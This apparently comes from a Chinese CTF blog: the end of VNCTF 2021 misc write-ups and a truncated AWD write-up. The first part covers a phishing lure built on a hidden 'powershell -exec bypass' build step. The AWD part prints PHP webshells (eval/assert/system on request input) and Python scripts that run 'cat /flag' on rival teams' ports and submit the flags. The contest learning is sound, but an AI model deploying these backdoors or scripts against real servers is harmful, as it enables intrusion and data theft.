class="code"><pre><span class="line">f87840bdddcc01e4</span><br></pre></td></tr></table></figure><p>打开压缩包，得到happynewyear.png</p><p>接下来就是stegpy的内容</p><p>stegpy工具的安装：</p><p><a href="https://blog.csdn.net/weixin_45728976/article/details/109018040">https://blog.csdn.net/weixin_45728976/article/details/109018040</a></p><p>附上改动后的出题人脚本，实现爆破</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import os</span><br><span class="line">from subprocess import Popen,PIPE</span><br><span class="line">import sys</span><br><span class="line">def checkwebp(pic):</span><br><span class="line">    print(&quot;IF you don&#39;t need a password for the pic please input 1&quot;) # 无密钥</span><br><span class="line">    print(&quot;IF you know the password of the pic please input 2&quot;) # 有密钥且已知</span><br><span class="line">    print(&quot;IF not input 3 I will use the password.txt&quot;) # 有密钥但未知</span><br><span class="line">    choice &#x3D; input()</span><br><span class="line">    if choice &#x3D;&#x3D; &#39;1&#39;:</span><br><span class="line">        os.system(&quot;stegpy &#123;&#125;&quot;.format(pic))</span><br><span class="line">    elif choice &#x3D;&#x3D; &#39;2&#39;:</span><br><span class="line">        print(&quot;INPUT THE password:&quot;)</span><br><span class="line">        password &#x3D; input()</span><br><span class="line">        cmd &#x3D; [&quot;stegpy&quot;, &quot;-p&quot;,pic]</span><br><span class="line">        subp &#x3D; Popen([sys.executable, &#39;-c&#39;, &#39;import pty, sys; pty.spawn(sys.argv[1:])&#39;, *cmd],stdin&#x3D;PIPE,stdout&#x3D;PIPE,stderr&#x3D;PIPE)</span><br><span class="line">        print(subp.stdout.read(len(&quot;Enter password (will not be echoed):&quot;)))</span><br><span class="line">        subp.stdin.write(bytes((password+&#39;\n&#39;).encode(&#39;utf-8&#39;)))</span><br><span class="line">        subp.stdin.flush()</span><br><span class="line">        print(subp.stdout.readlines())</span><br><span class="line">        # print(subp.stdout.readlines()[1])</span><br><span class="line">        print(&#39;\n&#39;)</span><br><span class="line">    elif choice &#x3D;&#x3D; &#39;3&#39;:</span><br><span class="line">        file &#x3D; open(&#39;password.txt&#39;, &#39;r&#39;)</span><br><span class="line">        line &#x3D; file.readline()</span><br><span class="line">        while line:</span><br><span class="line">            print(line)</span><br><span class="line">            cmd &#x3D; [&quot;stegpy&quot;, &quot;-p&quot;, pic]</span><br><span class="line">            subp &#x3D; Popen([sys.executable, &#39;-c&#39;, &#39;import pty, sys; pty.spawn(sys.argv[1:])&#39;, *cmd], stdin&#x3D;PIPE, stdout&#x3D;PIPE,stderr&#x3D;PIPE)</span><br><span class="line">            print(subp.stdout.read(len(&quot;Enter password (will not be echoed):&quot;)))</span><br><span class="line">            subp.stdin.write(bytes((line + &#39;\n&#39;).encode(&#39;utf-8&#39;)))</span><br><span class="line">            subp.stdin.flush()</span><br><span class="line">            print(&#39;result:&#39;)</span><br><span class="line">            print(subp.stdout.readlines()[1])</span><br><span class="line">            # print(subp.stdout.readlines()[1])</span><br><span class="line">            print(&#39;\n&#39;)</span><br><span class="line">            line &#x3D; file.readline()</span><br><span class="line">    else :</span><br><span class="line">        print(&#39;Input Wrong!&#39;)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    checkwebp(&#39;happynewyear.png&#39;)</span><br></pre></td></tr></table></figure><p><img src="HAPPY4.jpg" alt="HAPPY4"></p><p>得到flag</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">VNCTF&#123;HappyNewY3a5&#125;</span><br></pre></td></tr></table></figure><h3><span id="3">3</span></h3><h4><span id="vnctf-2021interesting_fishing">[VNCTF 2021]interesting_fishing</span></h4><blockquote><p>crazyman_army是某安全公司的研究人员</p><p>这天他的其邮箱里发现了一封奇怪的邮件</p><p>你能帮助他找到其隐藏的信息吗</p><p>附件是第一部分的flag</p><p>图片是第二部分的flag</p><p>最后flag为 第一部分+第二部分(vnctf{*})</p></blockquote><p>注释.txt:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crazyman_army是某安全公司的研究人员</span><br><span class="line">这天他的其邮箱里发现了一封奇怪的邮件 </span><br><span class="line">你能帮助他找到其隐藏的信息吗</span><br><span class="line"></span><br><span class="line">注意:</span><br><span class="line">附件是第一部分的flag</span><br><span class="line">图片是第二部分的flag</span><br><span class="line">最后flag为 第一部分+第二部分</span><br><span class="line"></span><br><span class="line">hint:powershell解码后的字符可能存在不可读的情况 那并不是解码错误</span><br></pre></td></tr></table></figure><p>研究项目的讨论.bin</p><p><img src="interesting1.jpg" alt="interesting1"></p><p>更改后缀为.eml，能看到是一封邮件。</p><p>用<a href="https://www.foxmail.com/">foxmail</a>打开</p><p>就可以把图片和附件另存为到本机了。</p><p>先处理附件：</p><p>发现giveyourflag.sln，用vs打开</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    std::cout &lt;&lt; &quot;Hi boy\n&quot;;</span><br><span class="line">    std::cout &lt;&lt; &quot;This is your flag:flag&#123;Th1s_iS_f@kE_fL4G&#125;\n&quot;;</span><br><span class="line">    getchar();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Visual Studio2017&gt;生成&gt;生成giveyourflag</p><p>若出现【无法找到v142的生成工具(平台工具集=“v142”)。】，Visual Studio2017&gt;项目&gt;giveyourflag属性&gt;配置属性&gt;常规&gt;平台工具集&gt;【v142(未安装)】更改为【Visual Studio 2017 (v141)】</p><p>重新生成后的得到报错【命令&quot;powershell -exec bypass -w hi&quot;dd&quot;en -f x64\Debug\Browse.VC.db】</p><p>缺少上述文件，但在压缩包里找不到。</p><p>可能是文件隐藏。</p><p>系统搜索【文件资源管理器选项】&gt;查看&gt;取消勾选”隐藏受保护的操作系统文件(推荐)“</p><p>看到该文件。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$encodestring &#x3D; &quot;XAB1AC0ANgA1ADQAMwAyAD8AXAB1AC0ANgA1ADQAMgAwAD8AXAB1AC0ANgA1ADQAMgAwAD8AXAB1AC0ANgA1ADQAMgA0AD8AXAB1AC0ANgA1ADQAMgAxAD8AXAB1AC0ANgA1ADQANwA4AD8AXAB1AC0ANgA1ADQAOAA5AD8AXAB1AC0ANgA1ADQAOAA5AD8AXAB1AC0ANgA1ADQAMQA4AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMwA3AD8AXAB1AC0ANgA1ADQAMgAwAD8AXAB1AC0ANgA1ADQAMwA0AD8AXAB1AC0ANgA1ADQAOQAxAD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA3AD8AXAB1AC0ANgA1ADQAOAA1AD8AXAB1AC0ANgA1ADQAOQAxAD8AXAB1AC0ANgA1ADQAOAA3AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAAzAD8AXAB1AC0ANgA1ADQAOAAxAD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAOAAyAD8AXAB1AC0ANgA1ADQAOAA3AD8AXAB1AC0ANgA1ADQAOAA3AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA1AD8AXAB1AC0ANgA1ADQAOQAwAD8AXAB1AC0ANgA1ADQAMwA3AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgAxAD8AXAB1AC0ANgA1ADQAOQAwAD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgA0AD8AXAB1AC0ANgA1ADQAOQAxAD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMwAwAD8AXAB1AC0ANgA1ADQAMwAxAD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMwAzAD8AXAB1AC0ANgA1ADQAOQAwAD8AXAB1AC0ANgA1ADQAMgA3AD8AXAB1AC0ANgA1ADQAMQA1AD8AXAB1AC0ANgA1ADQAMgAzAD8AXAB1AC0ANgA1ADQAMwA3AD8AXAB1AC0ANgA1ADQAMgA4AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMQA5AD8AXAB1AC0ANgA1ADQAMwA2AD8AXAB1AC0ANgA1ADQAOQAwAD8AXAB1AC0ANgA1ADQAMwA3AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgA3AD8AXAB1AC0ANgA1ADQAOAA5AD8AXAB1AC0ANgA1ADQANQA2AD8AXAB1AC0ANgA1ADQAMQA1AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMwAzAD8AXAB1AC0ANgA1ADQAMQA1AD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMwAzAD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMgAxAD8AXAB1AC0ANgA1ADQAMgAwAD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgAyAD8AXAB1AC0ANgA1ADQAMwA1AD8AXAB1AC0ANgA1ADQAMgAxAD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMgA4AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMQA3AD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMwA0AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgAyAD8AXAB1AC0ANgA1ADQAMwA1AD8AXAB1AC0ANgA1ADQAMwAxAD8AXAB1AC0ANgA1ADQAMwAzAD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMwAzAD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMwA2AD8AXAB1AC0ANgA1ADQAMgAxAD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgA3AD8AXAB1AC0ANgA1ADQAMwAxAD8AXAB1AC0ANgA1ADQAMwA2AD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQANQA4AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgAyAD8AXAB1AC0ANgA1ADQAMgAwAD8AXAB1AC0ANgA1ADQAMwAyAD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQANgAxAD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgAyAD8AXAB1AC0ANgA1ADQAMwA1AD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQANgA5AD8AXAB1AC0ANgA1ADQANQA3AD8AXAB1AC0ANgA1ADQANQAwAD8AXAB1AC0ANgA1ADQANgAzAD8AXAB1AC0ANgA1ADQANgA4AD8AXAB1AC0ANgA1ADQAOQAxAD8AXAB1AC0ANgA1ADQAOAA3AD8AXAB1AC0ANgA1ADQANwA5AD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMgA0AD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgAyAD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMwAxAD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAOQAwAD8AXAB1AC0ANgA1ADQAMgAyAD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgAyAD8A&quot;</span><br><span class="line">$bytes  &#x3D; [System.Convert]::FromBase64String($string);</span><br><span class="line">$decoded &#x3D; [System.Text.Encoding]::UTF8.GetString($bytes); </span><br><span class="line">echo $decoded</span><br></pre></td></tr></table></figure><p>根据代码，cyberchef经过from base64操作后得到</p><p>RTF格式下的unicode编码</p><p>附上官方脚本：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s&#x3D;r&quot;\u-65432?\u-65420?\u-65420?\u-65424?\u-65421?\u-65478?\u-65489?\u-65489?\u-65418?\u-65426?\u-65437?\u-65420?\u-65434?\u-65491?\u-65486?\u-65487?\u-65485?\u-65491?\u-65487?\u-65486?\u-65483?\u-65481?\u-65488?\u-65482?\u-65487?\u-65487?\u-65486?\u-65485?\u-65490?\u-65437?\u-65425?\u-65421?\u-65490?\u-65439?\u-65424?\u-65491?\u-65426?\u-65439?\u-65426?\u-65430?\u-65431?\u-65426?\u-65433?\u-65490?\u-65427?\u-65415?\u-65423?\u-65437?\u-65428?\u-65425?\u-65419?\u-65436?\u-65490?\u-65437?\u-65425?\u-65427?\u-65489?\u-65456?\u-65415?\u-65425?\u-65426?\u-65433?\u-65415?\u-65439?\u-65426?\u-65433?\u-65499?\u-65486?\u-65488?\u-65421?\u-65420?\u-65425?\u-65422?\u-65435?\u-65421?\u-65499?\u-65486?\u-65488?\u-65428?\u-65425?\u-65417?\u-65499?\u-65486?\u-65488?\u-65425?\u-65426?\u-65499?\u-65486?\u-65488?\u-65434?\u-65425?\u-65422?\u-65435?\u-65431?\u-65433?\u-65426?\u-65499?\u-65486?\u-65488?\u-65433?\u-65425?\u-65425?\u-65436?\u-65421?\u-65499?\u-65486?\u-65488?\u-65439?\u-65427?\u-65431?\u-65436?\u-65499?\u-65486?\u-65488?\u-65458?\u-65425?\u-65422?\u-65420?\u-65432?\u-65499?\u-65486?\u-65488?\u-65461?\u-65425?\u-65422?\u-65435?\u-65439?\u-65426?\u-65499?\u-65486?\u-65488?\u-65469?\u-65457?\u-65450?\u-65463?\u-65468?\u-65491?\u-65487?\u-65479?\u-65499?\u-65486?\u-65488?\u-65424?\u-65439?\u-65422?\u-65439?\u-65426?\u-65425?\u-65431?\u-65439?\u-65490?\u-65422?\u-65439?\u-65422?&quot;</span><br><span class="line">l&#x3D;list(s[3:-1].split(r&quot;?\u-&quot;))</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">for i in l:</span><br><span class="line">    flag+&#x3D;chr(65536-int(i))</span><br><span class="line">print(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行后得到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;vnctf-213-1257061123.cos.ap-nanjing.myqcloud.com&#x2F;Pyongyang%20stores%20low%20on%20foreign%20goods%20amid%20North%20Korean%20COVID-19%20paranoia.rar</span><br></pre></td></tr></table></figure><p>一个加密的压缩包，提示密码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">maskcode</span><br><span class="line">The password is: four digits</span><br></pre></td></tr></table></figure><p>ARCHPR爆破无果。</p><p>得到一个工具Accent RAR Password Recovery，发现【编码与密码】的压缩包里有，只不过存在版本问题，附上下载链接：<a href="https://gd.jisuxz.com/down_new/accent_rar_password_recovery.rar">https://gd.jisuxz.com/down_new/accent_rar_password_recovery.rar</a></p><p>但因为是英文版，就添加了【编码与密码】里的chinese.lng，再运行.reg文件</p><p>同时根据https://www.muruoxi.com/pc/2253.html修复报错</p><p><img src="interesting2.jpg" alt="interesting2"></p><p>利用密码【9705】打开压缩包，得到Pyongyang stores low on foreign goods amid North Korean COVID-19 paranoia.docx</p><p>更改后缀名.zip</p><p>解压后打开word&gt;hideinfo.xml</p><p><img src="interesting3.jpg" alt="interesting3"></p><p>宽字符隐写得</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vnctf&#123;APT_1S_c0M1nG</span><br></pre></td></tr></table></figure><p>第二部分图片：</p><p>另存为ThisIsSecret.jpg</p><p>用工具OurSecret</p><p>解密下半部分</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_fr0m_l@z@RuS&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vnctf&#123;APT_1S_c0M1nG_fr0m_l@z@RuS&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;1&quot;&gt;1&lt;/span&gt;&lt;/h3&gt;
&lt;h4&gt;&lt;span id=&quot;vnctf-2021冰冰好像藏着秘密&quot;&gt;[VNCTF 2021]冰冰好像藏着秘密&lt;/span&gt;&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;发现冰冰藏着的flag，flag格式为VNCTF{*</summary>
      
    
    
    
    
    <category term="challenge" scheme="http://mklkx.github.io/tags/challenge/"/>
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>AWD-1</title>
    <link href="http://mklkx.github.io/2021/03/22/AWD-1/"/>
    <id>http://mklkx.github.io/2021/03/22/AWD-1/</id>
    <published>2021-03-22T12:56:06.000Z</published>
    <updated>2021-05-04T11:38:46.927Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="simple">simple</span></h3><hr><p><strong>启示：新收获，体会到了AWD的乐趣</strong></p><blockquote><p>尽管笔者还是很菜，但是事后学会写批量化脚本成功后，还是体会到了AWD的乐趣，有点意思~</p></blockquote><hr><h4><span id="准备工作"><strong>准备工作：</strong></span></h4><p>通过WinSCP（Xshell等）连接登录后，备份/var/www/html，将此目录下的所有文件拖入D盾，发现部分漏洞。👇</p><p><img src="DLnYgx.jpg" alt="D盾"></p><p>挨个修叭</p><hr><h4><span id="1"><em>1</em></span></h4><h5><span id="config_commonphp"><strong>.config_common.php</strong></span></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0);</span><br><span class="line">set_time_limit(0);</span><br><span class="line">$a&#x3D;base64_decode(&quot;Y&quot;.&quot;X&quot;.&quot;N&quot;.&quot;z&quot;.&quot;Z&quot;.&quot;X&quot;.&quot;J&quot;.&quot;0&quot;);</span><br><span class="line">$a(@$&#123;&quot;_P&quot;.&quot;O&quot;.&quot;S&quot;.&quot;T&quot;&#125;[520]); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>简单分行后，将’YXNzZXJ0’进行base64加密后得’assert’,即assert(@$_POST[520]);，意为传入一个名为520的变量，方式为POST传参，后以PHP代码的方式执行。</p><p>因此，在网站上尝试POST传参’520=system(‘cat /flag’);'后可得flag。👇</p><p><img src="DLnGCR.jpg" alt="config_common"></p><p>接下来就是批量化的过程，明确思路：</p><p>1.攻击端口</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">port_start&#x3D;8801</span><br><span class="line">port_end&#x3D;8808</span><br><span class="line">my_port&#x3D;8802</span><br><span class="line">flag&#x3D;[]</span><br><span class="line">token&#x3D;&#39;1f208fe1a06b1d6db7ff6b7a7db3aefe&#39;</span><br></pre></td></tr></table></figure><p>2.获取flag</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def config_common(i):</span><br><span class="line">    attack_url&#x3D;&#39;http:&#x2F;&#x2F;XXX:&#39;+ str(i) +&#39;&#x2F;.config_common.php&#39;</span><br><span class="line">    data&#x3D;&#123;&quot;520&quot;:&quot;system(&#39;cat &#x2F;flag&#39;);&quot;&#125;</span><br><span class="line">    req&#x3D;requests.post(url&#x3D;attack_url,data&#x3D;data)</span><br><span class="line">    print(req.text)</span><br><span class="line">    flag.append(req.text)</span><br><span class="line">    #print(flag)</span><br><span class="line">    exception(req)</span><br></pre></td></tr></table></figure><p>3.提交flag</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for i in range(port_start,port_end+1):</span><br><span class="line">    if(i&#x3D;&#x3D;my_port):</span><br><span class="line">        continue</span><br><span class="line">    else:</span><br><span class="line">        config_common(i)</span><br><span class="line">        #pdd(i)</span><br><span class="line">        #function111(i)</span><br><span class="line">        #function4eff2(i)</span><br><span class="line">        #ciscn_notes(i)</span><br><span class="line">        #ciscn_config2(i)</span><br><span class="line">        #ciscn_include2(i)</span><br><span class="line">        #ciscn_url(i)</span><br><span class="line">        #ciscn_include(i)#冰蝎</span><br><span class="line">        #ciscn_config1(i)</span><br><span class="line">        submit_url&#x3D;&#39;http:&#x2F;&#x2F;XXX:9090&#x2F;&#39;</span><br><span class="line">        for i in flag:</span><br><span class="line">            submit_flag&#x3D;&#123;&#39;flag&#39;:i,&#39;token&#39;:token&#125;</span><br><span class="line">            requests.post(url&#x3D;submit_url,data&#x3D;submit_flag)</span><br><span class="line">time.sleep(60*5)</span><br></pre></td></tr></table></figure><p>其中还包括异常处理的部分，可逐步完善。</p><hr><h4><span id="2"><em>2</em></span></h4><h5><span id="pddphp"><strong>pdd.php</strong></span></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_REQUEST[&quot;pdsdt&quot;]);?&gt;</span><br></pre></td></tr></table></figure><p>与第一题大同小异，网页命令同为’pdsdt=system(‘cat /flag’);’</p><p>贴脚本，相同部分不再赘述：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def pdd(i):</span><br><span class="line">    attack_url&#x3D;&#39;http:&#x2F;&#x2F;XXX:&#39;+ str(i) +&#39;&#x2F;pdd.php&#39;</span><br><span class="line">    data&#x3D;&#123;&quot;pdsdt&quot;:&quot;system(&#39;cat &#x2F;flag&#39;);&quot;&#125;</span><br><span class="line">    req&#x3D;requests.post(url&#x3D;attack_url,data&#x3D;data)</span><br><span class="line">    print(req.text)</span><br><span class="line">    flag.append(req.text)</span><br><span class="line">    #print(flag)</span><br><span class="line">    exception(req)</span><br></pre></td></tr></table></figure><hr><h4><span id="3"><em>3</em></span></h4><h5><span id="111php"><strong>111.php</strong></span></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$pass&#x3D;$_POST[&quot;password&quot;];</span><br><span class="line">if($pass &#x3D;&#x3D; &quot;4eff2c041976ea22afb7092a53188c70&quot;)</span><br><span class="line">&#123;</span><br><span class="line">system($_GET[&quot;getshell&quot;]);</span><br><span class="line">readfile(&quot;&#x2F;flag&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;be1c5ff7101b7791469b5df2315cf75a&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>POST传入一个名为password的变量赋值给pass，若该变量（password=&gt;pass）==“4eff2c041976ea22afb7092a53188c70”,则系统自动返回根目录下flag的操作；若不是，则返回假的flag。</p><p>脚本如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def function111(i):</span><br><span class="line">    attack_url&#x3D;&#39;http:&#x2F;&#x2F;XXX:&#39;+ str(i) +&#39;&#x2F;uploads&#x2F;.111.php&#39;</span><br><span class="line">    data&#x3D;&#123;&quot;password&quot;:&quot;4eff2c041976ea22afb7092a53188c70&quot;&#125;</span><br><span class="line">    req&#x3D;requests.post(url&#x3D;attack_url,data&#x3D;data)</span><br><span class="line">    print(req.text)</span><br><span class="line">    flag.append(req.text)</span><br><span class="line">    #print(flag)</span><br><span class="line">    exception(req)</span><br></pre></td></tr></table></figure><hr><h4><span id="4"><em>4</em></span></h4><h5><span id="4eff2c041976ea22afb7092a53188c70php"><strong>4eff2c041976ea22afb7092a53188c70.php</strong></span></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">eval($_POST[&quot;cmd&quot;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>同第一第二题，脚本如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def function4eff2(i):</span><br><span class="line">    attack_url&#x3D;&#39;http:&#x2F;&#x2F;XXX:&#39;+ str(i) +&#39;&#x2F;uploads&#x2F;4eff2c041976ea22afb7092a53188c70.php&#39;</span><br><span class="line">    data&#x3D;&#123;&quot;cmd&quot;:&quot;system(&#39;cat &#x2F;flag&#39;);&quot;&#125;</span><br><span class="line">    req&#x3D;requests.post(url&#x3D;attack_url,data&#x3D;data)</span><br><span class="line">    print(req.text)</span><br><span class="line">    flag.append(req.text)</span><br><span class="line">    #print(flag)</span><br><span class="line">    exception(req)</span><br></pre></td></tr></table></figure><hr><h4><span id="5"><em>5</em></span></h4><h5><span id="ciscn_urlphp"><strong>ciscn_url.php</strong></span></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url &#x3D; $_GET[&#39;url&#39;];</span><br><span class="line">$parts &#x3D; parse_url($url);</span><br><span class="line">if(empty($parts[&#39;host&#39;]) || $parts[&#39;host&#39;] !&#x3D; &#39;localhost&#39;) &#123;</span><br><span class="line">    exit(&#39;error&#39;);</span><br><span class="line">&#125;</span><br><span class="line">readfile($url);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>与之前不同，此为get传参一个名为url的变量，赋值给了url，经过解析后传给了parts变量，若parts变量的host部分为空或不等于’localhost’，则error。故明确该命令的正确形式应该为’?url=file://localhost/flag’</p><p>脚本如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def ciscn_url(i):</span><br><span class="line">    attack_url&#x3D;&#39;http:&#x2F;&#x2F;XXX:&#39;+ str(i) +&#39;&#x2F;blog&#x2F;ciscn_url.php?&#39;</span><br><span class="line">    payload &#x3D; &#123;&quot;url&quot;:&quot;file:&#x2F;&#x2F;localhost&#x2F;flag&quot;&#125;</span><br><span class="line">    req &#x3D; requests.get(url&#x3D;attack_url,params&#x3D;payload)</span><br><span class="line">    print(req.text)</span><br><span class="line">    flag.append(req.text)</span><br><span class="line">    #print(flag)</span><br><span class="line">    exception(req)</span><br></pre></td></tr></table></figure><hr><h4><span id="6"><em>6</em></span></h4><h5><span id="ciscn_notesphp"><strong>ciscn_notes.php</strong></span></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line">include(&#39;ciscn_config.php&#39;);</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;id&#39;]))&#123;</span><br><span class="line">    $id &#x3D; mysql_real_escape_string($_GET[&#39;id&#39;]);</span><br><span class="line">    if(isset($_GET[&#39;topic&#39;]))&#123;</span><br><span class="line">        $topic &#x3D; mysql_real_escape_string($_GET[&#39;topic&#39;]);</span><br><span class="line">        $topic &#x3D; sprintf(&quot;AND topic&#x3D;&#39;%s&#39;&quot;, $topic);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $topic &#x3D; &#39;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    $sql &#x3D; sprintf(&quot;SELECT * FROM notes WHERE id&#x3D;&#39;%s&#39; $topic&quot;, $id);</span><br><span class="line">    $result &#x3D; mysql_query($sql,$con);</span><br><span class="line">    $row &#x3D; mysql_fetch_array($result);</span><br><span class="line">    if(isset($row[&#39;topic&#39;])&amp;&amp;isset($row[&#39;substance&#39;]))&#123;</span><br><span class="line">        echo &quot;&lt;h1&gt;&quot;.$row[&#39;topic&#39;].&quot;&lt;&#x2F;h1&gt;&lt;br&gt;&quot;.$row[&#39;substance&#39;];</span><br><span class="line">        die();</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;You&#39;re wrong!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class ciscn_nt &#123;</span><br><span class="line">    var $a;</span><br><span class="line">    var $b;</span><br><span class="line">    function __construct($a,$b) &#123;</span><br><span class="line">        $this-&gt;a&#x3D;$a;</span><br><span class="line">        $this-&gt;b&#x3D;$b;</span><br><span class="line">    &#125;</span><br><span class="line">    function test() &#123;</span><br><span class="line">       array_map($this-&gt;a,$this-&gt;b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$p1&#x3D;new ciscn_nt(assert,array($_POST[&#39;x&#39;]));</span><br><span class="line">$p1-&gt;test();</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span 